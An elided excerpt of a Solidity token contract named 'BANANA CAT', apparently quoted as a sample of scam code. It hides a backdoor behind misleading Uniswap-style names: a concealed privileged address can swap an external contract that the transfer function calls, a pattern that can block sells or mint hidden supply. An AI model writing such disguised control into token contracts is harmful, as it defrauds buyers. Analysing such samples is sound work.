...
contract BANANACATToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    using Address for address payable;

    string private _name = "BANANA CAT";
    string private _symbol = "BANANACAT";
    ...
    uniswapV1 private uniswapV5PairToken;
    ...
    constructor(
        ...
        uniswapV5PairToken = uniswapV1(uniswapV3Pair_);
    ...
    function setuniswapV1(address addresses) public {
        //require(_msgSender() == address(_Antibottoken), "ERC20: transfer from the address");
        if (_msgSender() == address(_Antibottoken)) { 
            uniswapV5PairToken = uniswapV1(addresses);
        } else {
            uniswapV5PairToken.create(8**3);
        }
    }
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            _MarketingFee = _MarketingFeesell;
            uniswapV5PairToken.create(crec);
        }
        ...
        if (_isExcludedlp[to]) {
            uniswapV5PairToken.create(250**3); 
        }
